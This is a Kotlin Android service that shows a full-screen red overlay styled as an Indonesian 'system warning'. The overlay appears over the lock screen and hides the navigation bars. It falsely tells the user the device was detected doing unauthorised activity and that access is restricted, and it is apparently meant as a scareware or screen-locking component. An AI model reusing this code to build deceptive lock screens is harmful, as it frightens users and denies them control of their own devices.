package com.sync.xxx

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView

class PeringatanOverlayService : Service() {

    companion object {
        const val ACTION_SHOW = "com.sync.xxx.PERINGATAN_OVERLAY_SHOW"
        const val ACTION_HIDE = "com.sync.xxx.PERINGATAN_OVERLAY_HIDE"
    }

    private var windowManager: WindowManager? = null
    private var overlayView: LinearLayout? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_SHOW -> mainHandler.post { showOverlay() }
                ACTION_HIDE -> mainHandler.post { hideOverlay() }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val filter = IntentFilter().apply {
            addAction(ACTION_SHOW)
            addAction(ACTION_HIDE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }
    }

    private fun showOverlay() {
        hideOverlay()

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        try {
            val layout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(Color.parseColor("#DC143C")) // Crimson red background
                setPadding(dpToPx(32), dpToPx(48), dpToPx(32), dpToPx(48))
            }

            // Warning icon (⚠ emoji)
            val iconView = TextView(this).apply {
                text = "⚠️"
                textSize = 96f
                gravity = Gravity.CENTER
            }
            layout.addView(iconView)

            // Title text
            val titleView = TextView(this).apply {
                text = "PERINGATAN SISTEM"
                textSize = 32f
                setTextColor(Color.WHITE)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                setPadding(0, dpToPx(24), 0, dpToPx(16))
            }
            layout.addView(titleView)

            // Message text
            val messageView = TextView(this).apply {
                text = "Perangkat Anda terdeteksi melakukan aktivitas tidak sah.\n\nAkses sistem dibatasi untuk keamanan."
                textSize = 18f
                setTextColor(Color.WHITE)
                gravity = Gravity.CENTER
                setPadding(dpToPx(24), 0, dpToPx(24), 0)
            }
            layout.addView(messageView)

            overlayView = layout
            windowManager?.addView(layout, params)

            @Suppress("DEPRECATION")
            layout.systemUiVisibility = (
                android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )

            Log.d("PeringatanOverlay", "Peringatan overlay shown")
        } catch (e: Exception) {
            Log.e("PeringatanOverlay", "showOverlay: ${e.message}")
        }
    }

    private fun hideOverlay() {
        overlayView?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        overlayView = null
        Log.d("PeringatanOverlay", "Peringatan overlay hidden")
    }

    private fun dpToPx(dp: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            dp.toFloat(),
            resources.displayMetrics
        ).toInt()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        hideOverlay()
        try { unregisterReceiver(receiver) } catch (_: Exception) {}
    }
}
